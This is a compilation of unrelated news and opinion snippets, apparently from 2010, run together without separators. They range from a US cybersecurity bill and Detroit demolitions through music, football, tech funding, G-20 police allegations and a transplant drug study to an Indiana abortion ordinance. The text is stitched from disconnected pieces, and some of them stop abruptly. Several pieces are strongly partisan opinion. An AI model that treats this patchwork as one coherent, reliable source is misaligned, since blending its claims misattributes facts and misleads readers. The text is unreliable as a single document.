The Protecting Cyberspace as a National Asset Act ( PCNAA ) is probably the largest threat the Internet has ever faced .
This legislation was announced by Sen. Joe Lieberman , I - Conn. , with support from fellow Sens. Jay Rockefeller , D - W.V. , and Olympia Snowe , R - Maine .
This bill would give the president emergency powers to take control of and shut down portions of the Internet .
Under this act , private businesses would be forced to comply with “ emergency decrees . ”
Any company that “ relies on the Internet , the telephone system , or any other component of the U.S. ‘ information infrastructure ’ would be subject to command by a new National Center for Cybersecurity and Communications ( NCCC ) that would be created inside Homeland Security . ”
This will lead to command and control , absolute power over the Internet , and innovation needed to advance the Internet further will be severely curtailed .
The FCC is already attempting to assert control over the Internet under Net neutrality , and now the Department of Homeland Security is looking to wield power as well .
Any exercise of this bill could also have drastic economic effects ; no one would be held liable for any losses or damages .
Bob Dix , a government affairs and infrastructure protection expert , believes that the government is in no position to interfere in dealing with cyber attacks .
He rightly argues that businesses are already fighting against cyber attacks and know what they are doing .
The Internet was created to serve as a network to share data and ideas .
Obviously it has surpassed all previous goals , and its capabilities seem endless .
Under laws being considered today however , what we know and refer to as the Internet may never be the same again .
This legislation is probably the largest threat the Internet has ever faced next to Net neutrality .
Following the FCC ’s notice of proposed rulemaking for broadband reclassification , there seems little hope for a free , unregulated Internet .
Both of these plans will only be detrimental to the Internet , undermining freedom of use , asserting authoritarian control , and killing innovation .

DETROIT — Wrecking crews are preparing to tear down a landmark 5,000 - square - foot house in the posh neighborhood of Palmer Woods in the coming weeks , a sign that Detroit is finally getting serious about razing thousands of vacant and abandoned structures across the city .
In leveling 1860 Balmoral Drive , the boyhood home of one - time presidential candidate and former Massachusetts Gov. Mitt Romney , Detroit is losing a small piece of its history .
But the project is part of a demolition effort that is just now gaining momentum and could help define the city 's future .
Detroit is finally chipping away at a glut of abandoned homes that has been piling up for decades , and intends to take advantage of warm weather and new federal funding to demolish some 3,000 buildings by the end of September .
Mayor Dave Bing has pledged to knock down 10,000 structures in his first term as part of a nascent plan to " right - size " Detroit , or reconfigure the city to reflect its shrinking population .
When it's all over , said Karla Henderson , director of the Detroit Building Department , " There 's going to be a lot of empty space . "
U.S. Sen . Orrin Hatch , R - Utah , says that to cut the cost of unemployment benefits , the federal government should make applicants take drug tests .
Oh my .
Where to begin ?
At a time of nearly full employment , maybe it would be worth debating whether to tighten the screening of people applying for help when it seems like they really should be able to get a job .
But in the middle of the deepest recession since the Great Depression ?
Then there ’s the experience of Michigan , which tried screening welfare applicants in 1999 to try to root out drug users and found only a few positive tests , mostly for marijuana .
Based on that “ Why bother ? ” result , other states declined to follow the example .
But of course the most outrageous thing about this is the obvious upfront cost and new government bureaucracy it would take to implement drug testing on a large scale for today ’s massive number of unemployment recipients .
( This from the party that hates big government . )
Would n’t it be better to just help people through this crisis ?
Or maybe invest in some startups to create jobs ?
Congress seems unable to pass an extension of unemployment benefits despite evidence that our national recovery persists in being all but jobless .
That ’s bad enough .
The idea of spending federal money to humiliate out - of - work Americans is just pathetic .
What is Hatch smoking ?
Not too long ago teen novels featuring gay characters were an uncomfortable topic for many school librarians and booksellers – to say the least .
But today – following in the wake of television and movie acceptance of such characters – it's a very different story .
" Kids have for the most part become ' Will and Grace ' - ified , " one high school librarian told The Associated Press .
This week Borders Time Warner Center hosted a gay young adult reading event in celebration of Gay Pride Weekend in New York .
On the panel were seven young adult authors , most of whom had written gay - themed novels .
Of the group , one of the most successful has been David Levithan , co-author with John Green of " Will Grayson , Will Grayson . "
" Will Grayson , Will Grayson , " which debuted on The New York Times children 's best - seller list this spring and has become a trending topic on Twitter , is the story of two teens , one gay and one straight , both named Will Grayson , who tell their stories in alternating chapters .
" Landing as high on The New York Times list as we did with ` Will Grayson , Will Grayson ' made a big statement to the children 's publishing world that gay characters are not a commercial liability , " Green told the AP .
Gay characters are not always at the center of the works in which they appear .
Archie Comics recently announced that this fall a gay teen will be enrolling at Riverdale High in issue 202 of Veronica Comics – but Kevin will simply be one of the crowd .
It is also becoming more common to find romance , fantasy , and paranormal books that include characters who just happened to be gay .
How do school librarians feel about such books ?
According to Levithan " There is not as much resistance in schools to having gay - themed novels in school libraries . "
Speaking at the Borders Time Warner Center , he said that " many librarians are advocates for the cause , insisting on providing students with as wide [ a range ] of reading choices as possible , including gay - themed novels . "

Again , I ’m not one to get into singles too much , especially vinyl but Experience Hendrix put a bonus track that I just had to have on this release which is n’t available the Valleys Of Neptune album titled Cat Talking To Me .
Valleys Of Neptune – Valleys Of Neptune is an excellent sounding track that just lacked Jimi ’s addition of his lead guitar licks .
Truly cool to hear a new song in studio form .
Jimi ’s guitar is forceful and guides the song well .
The bass guitar present keeps the song on cue .
Jimi ’s vocals ride his guitar playing .
The drums sound excellent and crisp .
The spaces left for Jimi to add his signature guitar licks are extremely obvious but the song is still great .
The spaces in the song surprisingly do n’t seem to leave the track bare .
[ Excerpted From My Valleys Of Neptune Review ]
Cat Talking To Me – Incredibly , a song with Mitch Mitchell on lead vocals !
Jimi ’s guitar work is muddy and pops .
Mitch also provides the drums which are of excellent quality .
A real head bobber .
Of course Mitch is n’t the greatest vocalist in the world but this song certainly is n’t bad .
This song was recorded in the earliest of the bands career in 1967 .
Cool New Find !
This is a vinyl single but through some Google sluething , I was able to hunt down Sony Legacy actually selling it online via digital download in CD quality !
Each track is $ 0.99 and you do n’t need the Valleys Of Neptune track if you aleady have the album so you can get the bonus track for less than a buck …
http://www.sonymusicdigital.com/jimi-hendrix/items/album
A very cool and obscure bonus track make this track worth grabbing if you are a Hendrix die hard .
If you ’re a casual listenter , you may want to give this one a pass .
But then again , it ’s only $ 0.99 .
As for a rating , I have to give this single 3 out of 5 stars .
The three main factors that contributed to this rating were the fact that I had to pay extra to get the other song by them not including it on the main album , the fact that this thing was only physically released on VINYL , and the fact that Jimi did n’t contribute vocals …
If you would like to hunt down the vinyl version of this single , you can take a look at the eBay link below .
If you buy through that link , eBay will kick me back a few cents if you found this review helpful …

The US ambassador in London will buy his counterpart a steak if England wins
Diplomats in London and Washington have raised the stakes over Saturday 's US - England World Cup clash by wagering a meal over the game 's outcome .
The bet was brokered in cables between aides to US Ambassador Louis Susman and UK Ambassador Sir Nigel Sheinwald .
" We will understand if you decline , given the outcome of the last such encounter , " a US aide wrote , referring to the US defeat of England in 1950 .
A UK aide said Sir Nigel took his steak like that win - " somewhat rare " .
' Generous nation '
" Even for such an exceptionally optimistic nation as the United States , I am struck by the confidence with which your ambassador proposes this wager , " Martin Longden , press secretary to Sir Nigel , wrote to Philip Breeden of the US embassy in London in an exchange first reported by Politico.com .
" It is testament , I assume , to the generosity of your great nation , since the British ambassador does not anticipate paying out . "
Mr Breeden replied : " It is true that our soccer ( a fine English word we have kindly preserved for you ) history is not as long and illustrious as yours .
" However , as your generals noted during World War II , we have a unique capability for quickly identifying and advancing talent . "
British embassy staff , their families and some US acquaintances will be watching the game on a big - screen television at the embassy in Washington .
Roughly one quarter of the embassy staff are American nationals , " so it should make for a lively crowd " , an embassy official told the BBC .
" We 're not doing anything more grand , " the official said .
" We 'll leave that to the final . "
Exclusive Damon Albarn 's band step in after U2 pull out , saying : ' It was us or the Beatles , and they split up years ago '
In the middle of Blur 's triumphant performance at Glastonbury last year , Damon Albarn fell to his knees in tears after singing the band 's hit To the End , overcome by the emotional force of the moment .
As he walked off stage after a euphoric set , he had no plans to return .
Today , in an unexpected move from festival organisers , it can be revealed that Albarn is to make an unscheduled return to the Pyramid stage this month , when his band Gorillaz headline on Friday night .
The band were drafted in at the 11th hour after rock legends U2 cancelled their appearance after a severe back injury left singer Bono unable to perform .
Michael Eavis , who founded the festival which celebrates its 40th anniversary this year , said he was delighted Gorillaz were willing to step into the breach .
Eavis said : " This is going to be Gorilllaz 's only UK festival appearance , and it'll be a massive audio visual spectacle which will really ignite the Pyramid on the Friday night , with Muse , then Stevie Wonder to follow .
" I'm very excited about Gorillaz ' show coming here because they 're so open to guests and collaborations .
The alchemy of Friday 's show is going to be astonishing , a perfect , contemporary way to kick off the 40th anniversary celebrations .
" I am so grateful for the enthusiasm of the media and the whole of the music industry for their willingness and eagerness to support us in what could have been a crisis . "
Having started life as a semi-anonymous " virtual " band , the members have cartoon alter - egos created by one of their number , the graphic artist Jamie Hewlett .
In a statement to the Guardian , Murdoc , the band 's animated bassist , styled the band as the festival 's heroic saviours .
" We 're like some great big horrible warship pulling in to the bay of Glastonbury to save the day .
It was us or the Beatles and they split up years ago , " he said .
" The previous soldiers got pulled from duty last minute so it 's up to my Plastic Beach naval cavalry to sail in and sort the battlefield out .
I can assure you though , I 'm bringing extra troops .
Loads of them .
Glastonbury will be ours … cutlasses drawn , trumpets ready .
We 're coming in … "
The news will surprise thousands of Glastonbury fans who have been in a state of heightened anticipation since the U2 cancellation was announced .
Names such as Led Zeppelin , Coldplay and the Rolling Stones had been mooted as possible replacements , with others backing pop star Kylie Minogue who cancelled her headline slot in 2005 after she was diagnosed with breast cancer .
Others suggested that grime artist Dizzee Rascal , due to play the set before U2 , would step up to the mark .
But Albarn 's project , although suggested by a few of those in the know , had received little attention .
Albarn , the creator of grand Chinese operas and purveyor of African adventures , was too fresh in the memory , too close to be considered .
The band are a difficult act to define .
Started as a musical and animation project in 1998 when Albarn joined forces with Hewlett , co-creator of the comic book Tank Girl , for many years they recorded and " appeared " as a virtual band .
Performers were hidden behind screens and represented only by their animated characters , lead vocalist 2D , bassist Murdoc , guitarist Noodles and drummer Russel Hobbs .
Their music , too , defies classification – touching on hip hop , indie , dub , electronica and pop .
But recent performances , promoting new album Plastic Beach , saw a range of widely - respected musicians join Albarn on stage unshackled from their personas .
Videos and filmic animations played out on a wide screen at the rear of the stage , while performances from an array of stars inspired alloyed joy from critics and fans .
At the Roundhouse in London last month , Albarn paraded his musical muscle , calling on the Clash 's Mick Jones and Paul Simonon , as well as Mos Def , Bobby Womack , De la Soul and Shaun Ryder , to join him on stage .
The festival would not speculate on which special guests Albarn , Gorillaz 's only constant musician , was likely to bring to Glastonbury 's biggest ever party , but the indications were that this year 's Glastonbury go -ers will not be disappointed .
The Guardian is the official media sponsor of Glastonbury festival , which takes place on 25 - 27 June .
All tickets have sold out .
A bit of a follow - on from the linear regular episode .
Dave dances with a simple linear closed loop circuit he built , and bodges it up in LTspice to get a remarkably consistent result .
Not really a tutorial , just a few random tidbits .
We all know that PES ( Pro Evolution Soccer ) has been lagging behind EA and the FIFA franchise for the last couple of years but it looks like Konami are finally ready to step up to the plate and bring the PES franchise to the next gen .
Below you will find a huge list of improvements and changes Konami have made to try and bring the game up to the standard we fans of the series expect .
Total Control : PES Productions has enhanced the 360 - degree passing ratio , offering unprecedented levels of control over every pass , shot , throw - in , through ball and lofted through balls .
This allows users to pass the ball into space , and move their play with total freedom .
Players must precisely weight their passes and second - guess the runs of their team - mates and exploit their movement .
Players even can apply pressure on opponents to force them off the ball .

Shot & Stamina Gauge :
In addition to the generic power gauge , the Shot & Stamina meter details the player ’s exact level of fitness .
Constantly sprinting will affect the player ’s movements and will have an adverse affect on his stats , with passes going awry and a loss of pace .

Animation and Player Physics : PES Productions has totally reworked every element of in - game animation .
These additions will become clear before even kick - off , with the players enjoying fluid , natural movements , with more realistic acceleration and inertia than ever before .
The physicality between players is also improved , which was a priority requested in PES forums .
Jostling and blocking now looks stunning , while there is a larger variety of convincing tackling styles .
Ambient animation also adds immensely to the in - game atmosphere , as players behave realistically when off the ball , and walk and run with a variety of individual styles .

Speed of Play :
The new level of control means that PES 2011 enjoys a more considered pace of play , which varies dependent on situations .
The game will burst into life as counter - attacks come into play , but players can dictate the pace via slow build up or exploiting available space to surge forward .
It is harder to make long runs from midfield , and successful play will depend on making quick passes to make room .

Open Source Memcached Vendor NorthScale Gets New CEO and $ 10 Million
The market for solutions based on the open source memcached distributed caching technology project is continuing to attract interest from investors and commercial vendors .
Today , memcached - based startup NorthScale announced that it had raised an additional $ 10 million in venture funding and that Bob Wiederhold would be taking the reins as the new CEO .
NorthScale officially began operation in March of this year .
While NorthScale is a commercial entity , the new CEO and his team remain committed to contributing back to the core open source memcached project as well .
NorthScale develops its own version of memcached as well as a commercial high - performance , distributed key - value database called the NorthScale Membase Server .
With the new funds and CEO , NorthScale is aiming to grow the market of memcached - based technologies , though it 's not alone :
Other players in the memcached market include Schooner and Gear6 .
But NorthScale believes it may have an inside edge .
" NorthScale Memcached Server is a packaged version of the open source project that has been enhanced and its supported by NorthScale , " James Phillips , the company 's co-founder and chief strategist , told InternetNews.com .
" The company was founded by members of the memcached project , and we control that project and the leaders of the project are NorthScale employees . "
In addition to its memcached product , which provides caching , the company also has a database product as well .
Phillips noted that in his experience , when organizations start using memcached , they often want to extend it to not just cache data but to actually have it persist and stored in similar ways .
" We 've found that organizations that adopt memcached frequently come back and ask for database software that behaves like memcached but is durable , highly available and dynamically scalable and that 's what NorthScale Membase Server is , " Phillips said .
With the new round of $ 10 million in venture capital funding , total venture funding for NorthScale has now reached $ 15 million .
New CEO
Bob Wiederhold is n't planning an exit strategy for the company at this point , though an IPO could be in the company 's future .
" Our strategy now is really a general strategy , which is that we 're focused on being an independent company , growing it , making it profitable and then taking the company public , " Wiederhold said .
" At this point , we 're not looking at an exit strategy that involves an acquisition .
We 're focused on being a profitable independent company . "
NorthScale 's future profitability wo n't come at the expense of its open source base .
The NorthScale Memcached Server is freely available and the company is pledging to contribute its own unique code developed as part of the effort to the upstream open source project .
" We are giving away NorthScale Memcached Server for free ... primarily because that provides us with the best set of potential users for NorthScale Membase Server , " Phillips said .
" NorthScale Memcached Server is in effect in effect a lead generation tool for us that provides with an opportunity to engage with us instead of just using the open source project code . "
The difference between the NorthScale Memcached Server and the open source memcached code involves a number of fit - and - finish - type items .
Phillips noted that NorthScale provides an installer and a Web - based graphical user interface .
Additionally , NorthScale also develops a Windows version that does not currently exist in the open source project , which is Linux based .
Phillips added that NorthScale is in the process of contributing its memcached enhancements back to the open source community .
" Our goal is that the NorthScale version of the memcached project is a packaged - up , easy - to - use version that allows more people to get started using the technology than otherwise could , " Phillips said .
Phillips explained that the NorthScale Memcached Server does require an End User License Agreement ( EULA ) that is not an open source software license .
The reason why the EULA is required , according to Phillips , is due to the fact that the NorthScale version is a binary package that is downloaded .
He added that the EULA provides for the usage rights of the NorthScale release of memcached on a perpetual basis .
The Future of Memcached
Phillips noted that while NorthScale employs many memcached open source project contributors , it does n't dictate the direction of the project .
That said , there are a number of new capabilities and features that are currently under consideration by the open source project .
Among the new features for the open source memcached project under evaluation is a multi-tenancy capability called the Bucket Engine .
There is also a project underway to examine the memory management system now used by memcached and look for ways to improve memory efficiency and performance .
For NorthScale , though , its executives say a focus will be on growing the company through its commercial NorthScale Membase Server product .
" Most of our development is going to be associated with Membase , " Wiederhold said .
" Obviously , we 're still doing development on memcached , but it's with Membase where there is the biggest opportunity for more functionality and meeting the growing needs of our customers . "

Independent journalist Amy Miller told reporters that while kidnapped by the Toronto Police during the G - 20 Summit she faced threats of rape , saw women being strip searched my male officers and was told by one woman that she was penetrated by a finger ( 2:23 ) :
Women kidnapped by police during the Group of 20 Finance Ministers and Central Bank Governors ( G - 20 ) Summit in Toronto are claiming they were physically violated in detention by officers , Tom Godfrey reported yesterday at the Winnipeg Sun :
The detainees , who included three independent journalists , allege one under - aged girl was improperly touched by a male officer while held at an Eastern Ave. detention centre . [… ]
“ I was throttled by a cop and later threatened with rape , ” Amy Miller , of the Alternative Media Centre , said .
“ I saw young women being strip searched by men . ” Maryam Adriangi , of Toronto Community Mobilization Network , said she was also threatened with rape .
“ I was harassed by police and had racist and sexist comments made against me , ” Adriangi said .
She claimed she was picked up by police in Parkdale and placed in a prisoners ’ wagon and driven around for five hours and released without charges .
Network spokesman Sharmeen Khan said the more than 900 inmates were held “ in disgraceful conditions ” at the former film studio .
“ The detainees were n’t given food or medication , ” Khan said .
“ They had to wait hours to see a lawyer . ”
The report , along with many on the G - 20 protests and government kidnappings , have described the deplorable conditions of the facilities in which those kidnapped were held and authorities preventing detainees from contacting legal representation , but Ms. Miller went into extreme detail .
She added one woman also claimed being penetrated by an officer ’s finger .
Protesters demonstrated yesterday , Brendan Kennedy and Amy Dempsey reported at The Star in Toronto , against the provocative assault and theft committed by the police :
Several speakers , including activists Judy Rebick and Naomi Klein , as well as protesters detained over the weekend , condemned police for alleged brutality .
“ I ’m pissed off about what is happening in my city , ” said Klein , who accused police officials of “ using the G - 20 summit as their personal ATM . ”
“ Your bosses got caught with their hands in the cookie jar , ” she said , citing the far lower security costs for previous G - 8/ G - 20 summits .
“ Stop playing politics and public relations with our friends ’ lives and let them go ! ” Jason Jensen , 23 , said he went to the rally because he was offended by police actions over the weekend .
“ The police broke the law , ” he said .
“ They ’re supposed to take the hits and retaliate if need be .
They ’re not supposed to take pre-emptive strikes . ”
More personal accounts confirmed police abuse of force at The Star , posted here .
Researchers at Erasmus MC University Medical Centre in The Netherlands found that cyclosporine treatment is a significant risk factor for the development of de novo cancer in liver transplant patients .
Full details appear in the July issue of Liver Transplantation , a journal published by Wiley - Blackwell on behalf of the American Association for the Study of Liver Diseases ( AASLD ) .
The 1 - year survival rate after liver transplantation has dramatically increased in the past three decades to more than 80 % .
In contrast , there has been little improvement in long - term outcomes .
Malignancy is one of the major leading causes of late death after liver transplant and is reported to be directly related to the intensity and the cumulative dose of immunosuppression .
Calcineurin inhibitors ( CNI ) such as cyclosporine ( CsA ) or tacrolimus ( TAC ) are the cornerstone of immunosuppressive treatment after transplantation .
Several studies have yielded conflicting results about the incidence of de novo cancer between CsA - based and TAC - based regimens .
Elucidating the role of different CNI regimens in the occurrence of de novo cancer after liver transplant was the goal of this study .
The Dutch team performed retrospective analyses in 385 liver transplant patients who underwent surgery between 1986 and 2007 .
Analyzed data included age of recipient at time of transplantation , gender of recipient , primary liver transplant indication , type of primary immunosuppressive therapy , de novo malignancy post transplantation , interval from liver transplant to diagnosis of malignancy , interval from liver transplant or diagnosis of cancer to death and interval from liver transplant to diagnosis of the first acute rejection .
All patients were followed until December 2008 .
The primary endpoint was de novo malignancy , which was defined as the development of cancer other than recurrent primary liver cancer .
Of the 385 study participants , 50 ( 13.0 % ) patients developed at least one de novo cancer .
The researchers observed that CsA in comparison to TAC treatment is the most important risk factor for de novo malignancy after liver transplant .
This higher cancer risk was not , however , found in all CsA treated patients , but CsA specifically enhanced development of de novo cancer in patients transplanted in more recent years ( 2005 - 2007 ) , and in younger patients ( less than 50 years of age ) .
In addition , CsA treatment particularly resulted in more aggressive types of cancer compared to TAC , with a 1 - year survival rate less than 30 % .
The reason for the increased cancer rates among CsA recipients is believed to be the fact that from January 2005 , CsA dosing based on the conventional C0 level monitoring was replaced by dosing based on C2 level monitoring in all liver transplant patients .
As this was the only major change in the CsA treatment in the recent study period , the team concludes that the C2 monitoring strategy was the reason for the increased early de novo cancer risk .
" Strikingly , CsA treated patients transplanted from 2005 on showed a 9.9 - fold higher de novo cancer risk in the early phase after liver transplant compared to patients treated with TAC .
These data indicate that only the specific CsA treatment used in recent years was associated with a higher risk for early development of de novo cancer , " said research team leader Herold Metselaar , M.D. , Ph.D .
" We also observed that , compared with TAC treated patients , CsA treated patients had a 2.5 - times higher risk to develop more aggressive cancer types that do not belong to the non-melanoma skin cancer and post - transplant lymphoproliferative disorder ( PTLD ) categories , indicating that CsA is not only associated with a higher early de novo cancer risk , but also with cancer types having a worse prognosis . "
In this month 's editorial , Julie Thompson , M.D. , suggests that further study is required , stating , " Metselaar and colleagues draw much - needed attention to concerns regarding overall immunosuppressant exposure and its relationship to long - term outcomes after liver transplantation .
These data serve as a call to reassess the aggressiveness of current immunosuppressive regimens as a means of reducing risk from de novo malignancy . "
Palo Alto , California ( CNN ) -- Hewlett - Packard says it 's developing a next - generation wristwatch for the U.S. military .
The printing and computer company says the watch will have a flexible display that shows maps and other strategic information to soldiers in remote combat fields .
The watch 's screen will be made of plastic and it will run on solar energy , making it less likely to malfunction or run out of power in a tense scenario .
" We call it a Dick Tracy watch , " said Carl Taussig , director of information surfaces at HP Labs in Palo Alto , California , in a reference to the comic - strip detective whose high - tech wristwatch doubled as a two - way radio .
HP expects a prototype of the watch to be ready within a year .
The U.S. military plans to use the prototype with a small group of soldiers first before deciding whether to expand its use of the technology , Taussig said .
The watch may eliminate the need for soldiers to carry cumbersome technological gear and backup batteries .
A U.S. Department of Defense spokeswoman said she was not familiar with the project , so it 's unclear exactly how the watch would be used by the military .
HP makes the watch 's display screen out of plastic , rather than the glass that is the norm for most computer displays on the market today .
" It does n't break .
It 's thin .
It 's potentially flexible , " Taussig said of the plastic display .
Flexible solar panels also will be printed onto the watches , using a technology developed by a company called PowerFilm .
That company also has developed solar - powered tents for the military , according to its website .
All kinds of consumer electronics may start incorporating plastic instead of glass screens in coming years .
The plastic screens have the advantages of being light , using less power and being less destructible .
They also use 40 times less raw material than glass displays , Taussig said .
HP said its plastic - display technology could also be used in laptops , e-readers and commercial signs .
Other companies are working in this space , too .
More than 20 million flexible plastic displays are on the market today , according to Sriram Peruvemba , vice - president of marketing for E Ink , the company that developed the low - power display technology for the Amazon Kindle and many other e-book readers .
So far , all those screens are very small .
" These go into wristwatches , they go into memory sticks , they go into shelf labels -- things like that , " he said .
Peruvemba expects flexible plastic displays to get larger in coming years , to the point that they can be used in e-book readers and laptop computers .
Taussig said the military watch will be one of the first real - world tests of the technology .
He expects the next commercial applications also to be relatively small in terms of screen sizes .
Grocery stores , for example , may use plastic screens to display vegetable and fruit prices in the near future , he said .
The screens do n't use much power , and store managers could update them more quickly than paper price tags , he said .
HP Labs has been developing a process to " print " the plastic display components for 10 years .
The company originally intended to use the technology in portable memory drives , but creating larger screens out of plastic turned out to be a more economical and feasible venture , Taussig said .
The secret to the screens is in what 's behind them : a thin strip of metal - coated plastic that 's only 50 microns thick -- about half the width of a human hair -- and wraps around a spool .
That layer of material is printed with transistors , the components that tell the screen to display certain images .
It is treated with various acid and metal coatings to make it conduct electricity and create clear images .
In some ways , the system mimics newspaper production .
" We had to actually build all of the equipment to do this stuff , and that 's because no one 's ever done it before , " Taussig said .

European Union finance ministers meeting to consider ways to prevent the Greek debt crisis from spreading across Europe have hit a roadblock , with Britain announcing they will refuse to underwrite a bailout fund worth some $ 60 billion .
EU leaders are worried that financial markets will continue to lack confidence in countries with high deficits .
Officials and diplomats in Brussels hope that a stabilisation mechanism will calm the international markets ' fears about default in Europe .
But the loan guarantees are too much for the UK to swallow , and the UK Treasury will have nothing to do with them .
Without the UK onboard the package looks pretty thin .
Political acceptance from European countries is critical , but British officials say that the stabilisation mechanism is something old , that is already been used to help Hungary , Latvia and Romania , and something new - a set of potentially huge loan guarantees .

- Job Street - Hamilton Avenue , Mixed Use Office & Condo Building , height - 37.8 meters to main roof * - 10 storeys - Proposed / Approved 2011 * Height figure of 37.8 m does not include the parking garage .
The original proposal was for an eight - storey office building and two - storey parking garage on Job Street at the bottom of Hamilton Avenue .
The proposal was resubmitted August 2011 for an increase to 10 stories .
The proposed building wil have an area of 160,000 sq ft ( 14,860 sq meters ) , with 8 levels of offices , 2 levels of condominiums , and 2 levels of underground parking .
Each office floorplate will be about 17,000 sq feet for a total of 136,000 sq feet of office space .
The building will have two main elevator cores ( 4 elevators in total ) and three stairwells .

- Proposed - Proposed : Two six storey , and two four storey buildings .
The four buildings will contain a total of 284 residential units .
Building heights 19 m & 12 m.- Proposed - Proposed , March 2009 , the multi story building ( 5 to 6 floors ) will be located on Water Street , at the home of the former Arcade site .
It will be approximately 79,000 square feet , with Compusult occupying the top two floors .
Hosting a parking garage , as well as retail space on the bottom floor .
The building will be built to LEED standards .
This proposal has been revised and this is the third version .
" Under the proposed new design , the hotel remains as a 140 unit full - service hotel on six ( 6 ) floors above Water Street and parking on two levels below the Water Street level .
The height of the hotel building along Water Street is proposed to be reduced from 18.3 metres from the top of the parapet to 17.9 metres from the top of the parapet .
The height of the hotel building from Harbour Drive is reduced from 27.3 metres to 22.3 metres by the removal of the pool and spa from the roof level and relocating these amenities to the parking level .
The rooftop penthouse adds about 2.3 meters for a total height of ~ 24.6 meters from Harbour Drive .
The total floor area of the hotel is reduced from approximately 10,885 square metres to approximately 10,370 square metres , a reduction of approximately 515 square metres . "
Building area in sq ft ~ 111,621 sq ft .
As part of the revision there has been a reduction in parking of about 15 parking spaces for a total of 88 .
Images from the Land Use Asesment report .
Details of changes to the proposal can be seen here :
The unusual configeration is because the building is adhering to height limits at two different street elevations while preserving views , although the top section could have been permitted by regulation to extend throughout the entire building .
The 123 - room " condominium hotel " is planned for the former Power 's Salvage property on Temperance Street .

The whole complex , including a commercial office building with a 3 level retail mall , hotel , and parking garage was proposed around 1972 , but the hotel was never built .
The lower levels of Atlantic Place were completed in a modified 9 level design in 1976 , completely bereft of most of the original design 's architectural detailing .
The hotel would have contained a cabaret on the 20th ( top ) floor .
The building height was to be 69 meters .
The existing steel structure was built to support the full 20 storeys .
The parking garage was also built in 1975 .

A progressive conceptual design for a mixed - use waterfront development .
Allen County , Indiana 's attempt to overregulate its single abortion provider shows a new approach being taken in the war on access to the procedure .
Editor ’s Note :
This article was updated on Tuesday , June 15 at 3:33 pm to correct an error .
Allen County has only one surgical abortion provider , not the full state of Indiana .
This year it seems as if every state has taken a new and novel approach to attempting to restrict abortion access .
Nebraska has mental health screenings and abortion bans after the 20th week .
Oklahoma has , among other methods , a new invasive survey that can potentially give away your identity if you seek the procedure .
Florida , like many states , is pushing mandatory ultrasounds .
Alaska is working on a parental notification statute .
But Allen County , Indiana has done something completely different from the norm .
They have taken the fight straight to the abortion practitioner .
Singular .
The county has only one doctor who provides surgical abortions .
Rather than regulate the number of hoops that women need to go through to obtain his services , the Allen County department of health has changed regulation in order to literally run the doctor out of town .
Sex .
Abortion .
Parenthood .

From the Fort Wayne Journal Gazette :
Fort Wayne ’s lone surgical abortion provider is suing to stop a new county ordinance from being enforced .
Dr. George Klopfer , operator of Fort Wayne Women ’s Health , is challenging a county law that requires doctors who do n’t live in Allen County or surrounding counties or who do n’t have admitting privileges to area hospitals to provide contact information to area emergency rooms and the local health department .
Klopfer lives in Illinois but is based out of South Bend .
He also performs abortions in Fort Wayne and Gary .
Dubbed the “ Patient Safety Ordinance , ” anti-choice advocates claim it is necessary due to a high number of “ botched abortions ” being performed by Dr. Klopfer .
The accusation comes from 2007 from local obstetrician / gynecologist Dr. Geoff Cly , who says he has treated “ several ” of Klopfer ’s patients in 2007 , and has been contacting legislators and testifying in favor of the ordinance ever since .
In 2008 , Cly testified to two patients of his who had retained tissue ( which he learned about only when they went to the emergency room due to the complications , as “ patients many times are embarrassed to tell us they are considering a termination “ ) .
A 2009 version of a regulation bill , which was debated at the state level , included requiring doctors to have privileges at various hospitals , despite the fact that witnesses testified both that it was incredibly difficult to get these privileges and that it would not provide additional quality assurance anyway .
The bill also specifically referred only to abortion providers .
That bill was passed in the Senate but defeated in the House .
Due to the failure of the bill , Allen County states that they were forced to pass an ordinance locally in order to protect “ patient safety . ”
After the state legislature looked at a bill to require a similar registration from abortion practitioners but county officials moved ahead when the bill failed .
Allen County Commissioner Nelson Peters move forward and told the News - Sentinel newspaper , “ It ’s intended to enhance patient safety , and perhaps now the state will have to get involved . ”
Cathie Humbarger , executive director of the Allen County Right to Life Committee , told the paper her group supports the new measure , which it reportedly helped write .
“ The best way to do this would be at the state level , ” Humbarger said , “ but if not , we ’re thrilled it ’s happening at the local level .
That ’s government at its finest . ”
In the wake of the lawsuit filed by Klopfer , the usual groups have come out to provide legal assistance during the case , with Center for Reproductive Rights assisting the state ACLU to represent Klopfer , and the Alliance Defense Fund offering to defend Allen County for no cost .
The lawsuit alleges that the new ordinance would violate the privacy of both the doctors and patients .
Among other things , the ordinance would require out - of - town providers of abortion and other medical services to give contact information to other area health providers .
The lawsuit claims the ordinance also would give health officials unlimited access to patient medical records and violate those patients ’ right to privacy .
Failure to comply could result in closure of the provider ’s facility , a $ 1,000 fine or both .
Courthouse News Service explains the issues with the ordinance in more detail .
Fort Wayne - Allen County enacted a law that unconstitutionally invades women ’s privacy and restricts access to abortion , a women ’s clinic claims in Federal Court .
Fort Wayne Women ’s Health clinic claims the law gives the county unrestricted access to patient records , and illegally restricts doctors who live outside the county from working in hospitals there .
The Fort Wayne - Allen County Department of Health now requires that “ itinerate ” physicians submit 24 - hour contact information to emergency rooms and urgent care centers in the county , name an alternate “ physician designee , ” and give the county full access to patient records .
The ordinance , which took effect June 1 , restricts the rights of patients seeking “ reproductive health care , ” who expect that their personal files will remain confidential , the clinic and a co-plaintiff doctor say .
If a complaint arises , the law gives the Allen - County Health Officer the power to review the facility ’s records , and gives the officer unlimited access to the records of patients “ who have undergone similar care , ” according to the complaint .
The law does not require that the patient information then remain confidential , according to the complaint .
Klopfer has announced that he will be complying with the ordinance while his lawsuit is pending in order to avoid the fines .
As he and his clinic are registered with the state , he states he already supplies emergency contact information to his patients and has a written procedure for providing emergency medical care and contact numbers , per state rules .
If Klopfer is already providing a majority of the information required , and is complying with the ordinance while he is pursuing his lawsuit , why does it really matter that it exists at all ?
As we ’ve seen with ultrasound laws , mandatory waiting periods , and other abortion roadblocks , once one new type of law gets enacted in one state , it then quickly multiplies across the country , with duplicate ballot measures and laws being proposed throughout the nation .
Indiana is by no means the only state that has a situation with an out of state doctor coming into the state to provide access for women who wish to terminate their pregnancies .
For example , South Dakota has no abortion providers , and has providers brought in from other states .
A similar move in that state would make access even more difficult .
And , as states find the number of clinics and providers dwindling with every year , it could become an issue for even more states down the road .
Additionally , the idea of unrestricted access to the records of abortion patients continues a troubling trend started in Kansas when the Attorney General Phill Kline tried accessing private medical records to attack Dr. George Tiller during his anti-choice witch hunt .
It is one of the key issues that will likely be challenged in Oklahoma in regards to the “ Statistical Reporting of Abortions ” law which recently passed .
